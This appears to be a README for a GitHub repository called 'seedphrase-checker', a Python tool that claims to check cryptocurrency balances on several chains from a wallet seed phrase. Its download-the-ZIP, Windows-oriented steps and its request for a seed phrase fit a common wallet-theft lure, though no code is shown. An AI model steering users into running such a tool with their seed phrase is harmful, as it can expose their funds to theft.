> [!TIP] 
> # How to run
> 
> ## Install Python
> 
> 1. Go to the official Python website: https://www.python.org/downloads/release/python-3139/
> 2. Scroll down to the files part. Then download the Windows installer (64-bit)
> 3. Once downloaded, run the installer.
> 4. ✅ Important: On the first screen of the installer, check the box that says
> “Add Python to PATH” before clicking Install Now.
> ## How to download the repo
> Click the button below to download the code as a .zip:
>
> <a href="https://github.com/shadrian345/seedphrase-checker/archive/refs/heads/main.zip"><img src="https://img.shields.io/badge/⬇️_Download_ZIP-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"></a>
>
> 
> Now extract the .zip folder
> 
> ## Run the script
> 
> Open the command prompt inside the extracted folder and run:
>
> `py crypto_balance_checker.py`
> 
>  or
> 
> `python crypto_balance_checker.py`


# Crypto Balance Checker

A Python tool to check the balances of multiple cryptocurrency wallets (Ethereum, Binance Smart Chain, Bitcoin, Litecoin, Tron) using a seed phrase.

## Prerequisites

- **Python 3.6+**
- **API Providers**:
  - **Ethereum**: Infura or Alchemy
  - **Bitcoin**: Public Blockchain API
  - **Binance Smart Chain**: BSC node
  - **Litecoin**: Public SoChain API
  - **Tron**: Tronpy library

## Installation

1. **Clone this repository** or save the script directly.
2. **Install required packages**:

   ```bash
   pip install web3 mnemonic bitcoinlib requests tronpy


### Notes:
- **Replace `YOUR_INFURA_PROJECT_ID`** with your actual Infura project ID.
- The Litecoin and Bitcoin balance retrieval uses public APIs, which may have limitations.

yt